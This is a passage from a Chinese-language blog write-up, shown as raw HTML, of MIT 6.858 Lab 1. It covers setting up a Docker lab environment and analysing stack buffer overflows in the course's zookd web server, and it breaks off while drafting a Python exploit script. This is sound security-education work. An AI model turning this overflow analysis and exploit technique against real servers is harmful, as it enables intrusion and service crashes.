class="hljs-number">22.04</span><br><br><span class="hljs-comment"># basic environment</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -i <span class="hljs-string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.list &amp;&amp; \</span><br><span class="language-bash">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span><br><span class="language-bash">    DEBIAN_FRONTEND=noninteractive \</span><br><span class="language-bash">    apt-get install -y git python3-pip tmux vim curl openssh-server strace gdb lxc lxc-dev</span><br><br><span class="hljs-comment"># sqlalchemy for lab, pwntools for my own</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> pip3 config <span class="hljs-built_in">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> pip3 install sqlalchemy pwntools flask z3-solver angr bytecode lxc</span><br><br><span class="hljs-comment"># pwndbg for a better debug experience</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">cd</span> /root &amp;&amp; \</span><br><span class="language-bash">    git <span class="hljs-built_in">clone</span> https://github.com/pwndbg/pwndbg &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">cd</span> /root/pwndbg &amp;&amp; \</span><br><span class="language-bash">    ./setup.sh</span><br><br><span class="hljs-comment"># I&#x27;d like to make a new user for it</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> useradd -m student</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> usermod -s /bin/bash student</span><br><br><span class="hljs-comment"># clone the lab</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">cd</span> /home/student &amp;&amp; \</span><br><span class="language-bash">    git <span class="hljs-built_in">clone</span> https://web.mit.edu/6858/2022/lab.git &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">chown</span> -R student:student ./lab</span><br><br><span class="hljs-comment"># make your ssh key authorized</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> /home/student/.ssh &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;è¿™é‡Œå†™ä½ çš„sshå…¬é’¥&quot;</span> &gt; /home/student/.ssh/authorized_keys</span><br><br><span class="hljs-comment"># start ssh service and keep container running continuously</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/bash\nservice ssh start\nsleep infinity&quot;</span> &gt; /root/start.sh &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">chmod</span> +x /root/start.sh</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/root/start.sh&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>å› ä¸ºå®éªŒè¦å…³ ASLR æ‰€ä»¥æˆ‘ä»¬åœ¨å¯åŠ¨ docker æ—¶éœ€è¦ <code>--privileged</code>ï¼Œä¸è¿‡å› ä¸ºåªæ˜¯å®éªŒç”¨çš„å®¹å™¨æ‰€ä»¥æ— æ‰€è°“ï¼ŒåŒæ—¶ä¸ºäº†å¤–ç½‘èƒ½è®¿é—®åˆ°æ‰€ä»¥è¿™é‡Œé…äº†å‡ ä¸ªç«¯å£è½¬å‘ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker build -t <span class="hljs-string">&quot;mit_6858_img&quot;</span> .</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker run -d --privileged -p <span class="hljs-string">&quot;8080:8080&quot;</span> -p <span class="hljs-string">&quot;2022:22&quot;</span> -h <span class="hljs-string">&quot;mit_6858_docker&quot;</span> --name=<span class="hljs-string">&quot;mit_6858&quot;</span> mit_6858_img</span><br></code></pre></td></tr></table></figure><p>ä¹‹åæˆ‘ä»¬ä¾¿èƒ½ç›´æ¥è¿›åˆ°å®¹å™¨å†…éƒ¨ç»§ç»­å®éªŒï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker <span class="hljs-built_in">exec</span> -it mit_6858 /bin/bash</span><br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥é€šè¿‡ ssh è¿›è¡Œè¿œç¨‹è¿æ¥ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ssh student@your_server_ip -p 2022</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/03/RqEPmQyLzUskg4e.png" alt="image.png"></p><h3 id="EXTRA-vscode-è¿æ¥"><a href="#EXTRA-vscode-è¿æ¥" class="headerlink" title="EXTRA.vscode è¿æ¥"></a>EXTRA.vscode è¿æ¥</h3><p>å› ä¸ºæˆ‘ä»¬çš„å®éªŒç¯å¢ƒéƒ½æœ‰ sshï¼Œæ‰€ä»¥ç›´æ¥ç”¨ vscode é€šè¿‡ ssh è¿æ¥æ˜¯éå¸¸æ–¹ä¾¿çš„ä¸€ä»¶äº‹æƒ…ï¼ˆå®¹å™¨é…ä¸Šç«¯å£è½¬å‘ä¹Ÿå¯ä»¥è¿æ¥ï¼‰</p><p> é¦–å…ˆåœ¨æ‰©å±•é‡Œæ‰¾åˆ° ssh æ’ä»¶å¹¶å®‰è£…</p><p><img src="https://s2.loli.net/2022/12/03/VlTkD8N5BPFUq7v.png" alt="image.png"></p><p>æ·»åŠ  host ä¿¡æ¯</p><p><img src="https://s2.loli.net/2022/12/03/U4ORh8JaWXulVB2.png" alt="image.png"></p><p>ä¹‹åç›´æ¥è¿æ¥ä¸Šå»å°±è¡Œäº†</p><p><img src="https://s2.loli.net/2022/12/03/vNnUWPgELZIByY4.png" alt="image.png"></p><h1 id="0x01-Lab1-Buffer-overflows"><a href="#0x01-Lab1-Buffer-overflows" class="headerlink" title="0x01. Lab1: Buffer overflows"></a>0x01. Lab1: Buffer overflows</h1><h2 id="Part-1-Finding-buffer-overflows"><a href="#Part-1-Finding-buffer-overflows" class="headerlink" title="Part 1: Finding buffer overflows"></a>Part 1: Finding buffer overflows</h2><p>é¦–å…ˆç»™äº†ä¸€ä¸ªèµ„æ–™ï¼š<a href="https://thesquareplanet.com/blog/smashing-the-stack-21st-century/">Smashing the stack in the 21st century</a>ï¼ŒåŸºç¡€è–„å¼±çš„åŒå­¦å¯ä»¥ä»”ç»†çœ‹çœ‹ï¼Œç¬”è€…è¿™é‡Œç›´æ¥è·³è¿‡ï¼Œç„¶åæ˜¯ Exercise 1ï¼š</p><blockquote><p><strong>Exercise 1.</strong> Study the web serverâ€™s C code (in <code>zookd.c</code> and <code>http.c</code>), and find one example of code that allows an attacker to overwrite the return address of a function. Hint: look for buffers allocated on the stack. Write down a description of the vulnerability in the file <code>answers.txt</code>. For your vulnerability, describe the buffer which may overflow, how you would structure the input to the web server (i.e., the HTTP request) to overflow the buffer and overwrite the return address, and the call stack that will trigger the buffer overflow (i.e., the chain of function calls starting from <code>process_client</code>).</p><p>It is worth taking your time on this exercise and familiarizing yourself with the code, because your next job is to exploit the vulnerability you identified. In fact, you may want to go back and forth between this exercise and later exercises, as you work out the details and document them. That is, if you find a buffer overflow that you think can be exploited, you can use later exercises to figure out if it indeed can be exploited. It will be helpful to draw a stack diagram like the figures in <a href="https://thesquareplanet.com/blog/smashing-the-stack-21st-century/">Smashing the Stack in the 21st Century</a>.</p></blockquote><p>å¤§æ¦‚æ˜¯é˜…è¯»  <code>zookd.c</code> å’Œ <code>http.c</code> æ‰¾æ¼æ´ï¼Œæç¤ºå…³æ³¨åœ¨æ ˆä¸Šåˆ†é…çš„ bufferï¼Œå¹¶å°†ç­”æ¡ˆå†™åœ¨ <code>answers.txt</code> ä¸­<del>ï¼ˆğŸ‘´ï¼šâ“ï¼‰</del></p><p>é¦–å…ˆçœ‹ <code>zookd.c</code>ï¼Œæºç æ¯”è¾ƒç®€æ´ï¼Œæ ¸å¿ƒé€»è¾‘åœ¨ <code>run_server()</code> ä¸­ï¼Œé¦–å…ˆä¼šè°ƒç”¨ <code>start_server()</code> åˆ›å»ºä¸€ä¸ª http æœåŠ¡å™¨ï¼Œä¹‹ååœ¨ <code>run_server()</code> ä¸­æœ‰ä¸€ä¸ªæ— é™å¾ªç¯è°ƒç”¨ <code>accept()</code> æ¥æ”¶è¯·æ±‚å <code>fork()</code> å‡ºå­è¿›ç¨‹è°ƒç”¨ <code>process_client()</code> å¤„ç†</p><h4 id="process-client-ï¼šå¤„ç†å•æ¬¡-HTTP-request"><a href="#process-client-ï¼šå¤„ç†å•æ¬¡-HTTP-request" class="headerlink" title="process_client()ï¼šå¤„ç†å•æ¬¡ HTTP request"></a>process_client()ï¼šå¤„ç†å•æ¬¡ HTTP request</h4><p> <code>process_client()</code> çš„é€»è¾‘ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œä¸»è¦æ˜¯è°ƒç”¨ <code>http_request_line()</code> è·å–è¯·æ±‚å¤´ç¬¬ä¸€è¡Œï¼Œä¹‹åç»™åˆ° <code>env_deserialize()</code> è§£æç¯å¢ƒå˜é‡ï¼Œä¹‹åè°ƒç”¨ <code>http_request_headers()</code> è§£æå‰©ä¸‹çš„ headerï¼Œæœ€åè°ƒç”¨ <code>http_serve()</code> å¤„ç†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">process_client</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> env[<span class="hljs-number">8192</span>];  <span class="hljs-comment">/* static variables are not on the stack */</span><br>    <span class="hljs-type">static</span> <span class="hljs-type">size_t</span> env_len = <span class="hljs-number">8192</span>;<br>    <span class="hljs-type">char</span> reqpath[<span class="hljs-number">4096</span>];<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errmsg;<br><br>    <span class="hljs-comment">/* get the request line */</span><br>    <span class="hljs-keyword">if</span> ((errmsg = http_request_line(fd, reqpath, env, &amp;env_len)))<br>        <span class="hljs-keyword">return</span> http_err(fd, <span class="hljs-number">500</span>, <span class="hljs-string">&quot;http_request_line: %s&quot;</span>, errmsg);<br><br>    env_deserialize(env, <span class="hljs-keyword">sizeof</span>(env));<br><br>    <span class="hljs-comment">/* get all headers */</span><br>    <span class="hljs-keyword">if</span> ((errmsg = http_request_headers(fd)))<br>      http_err(fd, <span class="hljs-number">500</span>, <span class="hljs-string">&quot;http_request_headers: %s&quot;</span>, errmsg);<br>    <span class="hljs-keyword">else</span><br>      http_serve(fd, getenv(<span class="hljs-string">&quot;REQUEST_URI&quot;</span>));<br><br>    close(fd);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="http-request-line-ï¼šè§£æ-header-ç¬¬ä¸€è¡Œ"><a href="#http-request-line-ï¼šè§£æ-header-ç¬¬ä¸€è¡Œ" class="headerlink" title="http_request_line()ï¼šè§£æ header ç¬¬ä¸€è¡Œ"></a>http_request_line()ï¼šè§£æ header ç¬¬ä¸€è¡Œ</h4><p>ç°åœ¨æ¥çœ‹ <code>http_request_line()</code>ï¼Œå…¶é¦–å…ˆè°ƒç”¨äº†ä¸€ä¸ªå‡½æ•° <code>http_read_line()</code> ä» TCP è¿æ¥ä¸­è¯»å–ä¸€æ•´è¡Œï¼ˆread() ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚åœ°è¯»ï¼Œä¸€ç›´è¯»åˆ° <code>\n</code> å¹¶è¿”å›è¯»å–çš„å­—èŠ‚æ•°ï¼Œå¯¹äº <code>\r</code> è‡ªåŠ¨è·³è¿‡ï¼Œå¤±è´¥åˆ™è¿”å› <code>-1</code>ï¼Œä»£ç å°±ä¸è´´äº†ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">http_request_line</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> *reqpath, <span class="hljs-type">char</span> *env, <span class="hljs-type">size_t</span> *env_len)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> buf[<span class="hljs-number">8192</span>];      <span class="hljs-comment">/* static variables are not on the stack */</span><br>    <span class="hljs-type">char</span> *sp1, *sp2, *qp, *envp = env;<br><br>    <span class="hljs-comment">/* For lab 2: don&#x27;t remove this line. */</span><br>    touch(<span class="hljs-string">&quot;http_request_line&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (http_read_line(fd, buf, <span class="hljs-keyword">sizeof</span>(buf)) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Socket IO error&quot;</span>;<br></code></pre></td></tr></table></figure><p>ä¹‹åè§£æè·¯å¾„ä¸è¯·æ±‚ç±»å‹ï¼Œä¸»è¦å°±æ˜¯ç”¨ <code>strchr()</code> è¿›è¡Œåˆ†éš”ååˆ¤æ–­ï¼Œå¹¶å°†ç»“æœå†™åˆ° <code>env</code> ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Parse request like &quot;GET /foo.html HTTP/1.0&quot; */</span><br>sp1 = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27; &#x27;</span>);<br><span class="hljs-keyword">if</span> (!sp1)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cannot parse HTTP request (1)&quot;</span>;<br>*sp1 = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>sp1++;<br><span class="hljs-keyword">if</span> (*sp1 != <span class="hljs-string">&#x27;/&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Bad request path&quot;</span>;<br><br>sp2 = <span class="hljs-built_in">strchr</span>(sp1, <span class="hljs-string">&#x27; &#x27;</span>);<br><span class="hljs-keyword">if</span> (!sp2)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cannot parse HTTP request (2)&quot;</span>;<br>*sp2 = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>sp2++;<br><br><span class="hljs-comment">/* We only support GET and POST requests */</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;GET&quot;</span>) &amp;&amp; <span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;POST&quot;</span>))<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Unsupported request (not GET or POST)&quot;</span>;<br><br>envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;REQUEST_METHOD=%s&quot;</span>, buf) + <span class="hljs-number">1</span>;<br>envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;SERVER_PROTOCOL=%s&quot;</span>, sp2) + <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>ç„¶åè§£æè¯·æ±‚ä¸­çš„å‚æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* parse out query string, e.g. &quot;foo.py?user=bob&quot; */</span><br><span class="hljs-keyword">if</span> ((qp = <span class="hljs-built_in">strchr</span>(sp1, <span class="hljs-string">&#x27;?&#x27;</span>)))<br>&#123;<br>    *qp = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;QUERY_STRING=%s&quot;</span>, qp + <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¹‹åè°ƒç”¨ <code>url_decode(dst, src)</code> è§£æ request URLï¼Œè¿™ä¸ªå‡½æ•°ä¸»è¦å°±æ˜¯æŠŠ URL é‡Œçš„ <code>%ab</code> æ¢æˆ <code>0xab</code> ï¼ŒæŠŠ <code>+</code> æ¢æˆ ç©ºæ ¼ï¼Œç”± <code>src</code> æ‹·è´åˆ° <code>dst</code> ï¼›æœ€åå°†ç»“æœå†™å› <code>env</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-comment">/* decode URL escape sequences in the requested path into reqpath */</span><br>    url_decode(reqpath, sp1);<br><br>    envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;REQUEST_URI=%s&quot;</span>, reqpath) + <span class="hljs-number">1</span>;<br><br>    envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;SERVER_NAME=zoobar.org&quot;</span>) + <span class="hljs-number">1</span>;<br><br>    *envp = <span class="hljs-number">0</span>;<br>    *env_len = envp - env + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="http-request-headers-ï¼šè§£æ-header-å‰©ä½™éƒ¨åˆ†ï¼ˆå­˜åœ¨æ¼æ´ï¼‰"><a href="#http-request-headers-ï¼šè§£æ-header-å‰©ä½™éƒ¨åˆ†ï¼ˆå­˜åœ¨æ¼æ´ï¼‰" class="headerlink" title="http_request_headers()ï¼šè§£æ header å‰©ä½™éƒ¨åˆ†ï¼ˆå­˜åœ¨æ¼æ´ï¼‰"></a>http_request_headers()ï¼šè§£æ header å‰©ä½™éƒ¨åˆ†ï¼ˆå­˜åœ¨æ¼æ´ï¼‰</h4><p>è¿›æ¥é¦–å…ˆæ˜¯ä¸€ä¸ªå¤§å¾ªç¯ï¼Œæ¯æ¬¡å¾ªç¯éƒ½ä¼šè°ƒç”¨ <code>http_read_line()</code> è¯»å–ä¸€è¡Œ header è¿›è¡Œè§£æï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">http_request_headers</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> buf[<span class="hljs-number">8192</span>];      <span class="hljs-comment">/* static variables are not on the stack */</span><br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">char</span> value[<span class="hljs-number">512</span>];<br>    <span class="hljs-type">char</span> envvar[<span class="hljs-number">512</span>];<br><br>    <span class="hljs-comment">/* For lab 2: don&#x27;t remove this line. */</span><br>    touch(<span class="hljs-string">&quot;http_request_headers&quot;</span>);<br><br>    <span class="hljs-comment">/* Now parse HTTP headers */</span><br>    <span class="hljs-keyword">for</span> (;;)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (http_read_line(fd, buf, <span class="hljs-keyword">sizeof</span>(buf)) &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Socket IO error&quot;</span>;<br><br>        <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\0&#x27;</span>)     <span class="hljs-comment">/* end of headers */</span><br>            <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p>ä¹‹åæ˜¯è§£æ <code>key: value</code> å‹çš„å€¼ï¼Œé¦–å…ˆæ˜¯ <code>shrchr()</code> æŒ‰ç©ºæ ¼è¿›è¡Œåˆ†å‰²ï¼Œç„¶åå°† <code>key</code> è½¬æˆå¤§å†™ä¸” <code>-</code> è½¬æˆ <code>_</code> ï¼Œä¹‹åè°ƒç”¨ <code>url_decode()</code> è§£æ</p><ul><li>è¿™é‡Œæˆ‘ä»¬æ³¨æ„åˆ° <code>value</code> æ˜¯ä¸€ä¸ª<strong>ä½äºå‡½æ•°æ ˆä¸Šçš„å­—ç¬¦æ•°ç»„ï¼Œé•¿åº¦ä»…ä¸º 512</strong>ï¼Œè€Œè¯¥ HTTP server æ‰€å…è®¸çš„å•è¡Œæœ€å¤§é•¿åº¦ä¸º 8192 å­—ç¬¦ï¼Œè¿™æ„å‘³ç€<strong>æˆ‘ä»¬å¯ä»¥å¾ˆè½»æ˜“åœ°é€šè¿‡ä¼ å…¥ä¸€ä¸ªè¾ƒé•¿çš„é”®å€¼å¯¹å‚æ•°æ¥å®Œæˆæ ˆæº¢å‡º</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Parse things like &quot;Cookie: foo bar&quot; */</span><br><span class="hljs-type">char</span> *sp = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27; &#x27;</span>);<br><span class="hljs-keyword">if</span> (!sp)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Header parse error (1)&quot;</span>;<br>*sp = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>sp++;<br><br><span class="hljs-comment">/* Strip off the colon, making sure it&#x27;s there */</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(buf) == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Header parse error (2)&quot;</span>;<br><br><span class="hljs-type">char</span> *colon = &amp;buf[<span class="hljs-built_in">strlen</span>(buf) - <span class="hljs-number">1</span>];<br><span class="hljs-keyword">if</span> (*colon != <span class="hljs-string">&#x27;:&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Header parse error (3)&quot;</span>;<br>*colon = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br><span class="hljs-comment">/* Set the header name to uppercase and replace hyphens with underscores */</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(buf); i++) &#123;<br>    buf[i] = <span class="hljs-built_in">toupper</span>(buf[i]);<br>    <span class="hljs-keyword">if</span> (buf[i] == <span class="hljs-string">&#x27;-&#x27;</span>)<br>        buf[i] = <span class="hljs-string">&#x27;_&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">/* Decode URL escape sequences in the value */</span><br>url_decode(value, sp);<br></code></pre></td></tr></table></figure><p>æœ€åéƒ¨åˆ†å°±æ˜¯å¦‚æœ <code>key</code> ä¸ä¸º <code>CONTENT_TYPE</code> æˆ– <code>CONTENT_LENGTH</code> åˆ™åœ¨å‰é¢åŠ ä¸Šå­—ç¬¦ä¸² <code>HTTP_</code> åå­˜å‚¨åˆ° <code>envvar</code> ä¸­ï¼Œå¹¶è°ƒç”¨ <code>setenv()</code> è®¾ç½®  <em>ç¯å¢ƒå˜é‡</em>  ä¸­çš„å¯¹åº”å€¼</p><ul><li>è¿™é‡Œæˆ‘ä»¬æ³¨æ„åˆ° <code>envvar</code> ä¹Ÿæ˜¯ä¸€ä¸ª<strong>ä½äºå‡½æ•°æ ˆä¸Šçš„é•¿åº¦ä»…ä¸º 512çš„å­—ç¬¦æ•°ç»„</strong>ï¼Œå› æ­¤åœ¨è¿™é‡Œä¹Ÿå¯ä»¥å‘ç”Ÿ<strong>æ ˆæº¢å‡º</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">        <span class="hljs-comment">/* Store header in env. variable for application code */</span><br>        <span class="hljs-comment">/* Some special headers don&#x27;t use the HTTP_ prefix. */</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;CONTENT_TYPE&quot;</span>) != <span class="hljs-number">0</span> &amp;&amp;<br>            <span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;CONTENT_LENGTH&quot;</span>) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">sprintf</span>(envvar, <span class="hljs-string">&quot;HTTP_%s&quot;</span>, buf);<br>            setenv(envvar, value, <span class="hljs-number">1</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            setenv(buf, value, <span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆä¸‹é¢æˆ‘ä»¬æ¥åˆ° Exercise2ï¼Œå†™ä¸€ä¸ª exp æ¥è®© zookd ç¨‹åº crash æ‰ï¼š</p><blockquote><p><strong>Exercise 2.</strong> Write an exploit that uses a buffer overflow to crash the web server (or one of the processes it creates). You do not need to inject code at this point. Verify that your exploit crashes the server by checking the last few lines of <code>dmesg | tail</code>, using <code>gdb</code>, or observing that the web server crashes (i.e., it will print <code>Child process 9999 terminated incorrectly, receiving signal 11</code>)</p><p>Provide the code for the exploit in a file called <code>exploit-2.py</code>.</p><p>The vulnerability you found in Exercise 1 may be too hard to exploit. Feel free to find and exploit a different vulnerability.</p></blockquote><p>æˆ‘ä»¬ç°åœ¨æ¥æµ‹è¯•ä¸€ä¸‹è¿™ä¸ªæ¼æ´ï¼Œé¦–å…ˆç¼–å†™ä¸€ä¸ªæ­£å¸¸çš„ HTTP Get è¯·æ±‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">host, port</span>):<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((host, <span class="hljs-built_in">int</span>(port)))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    payload = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + <span class="hljs-string">b&quot;rat3bant&quot;</span> + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    payload 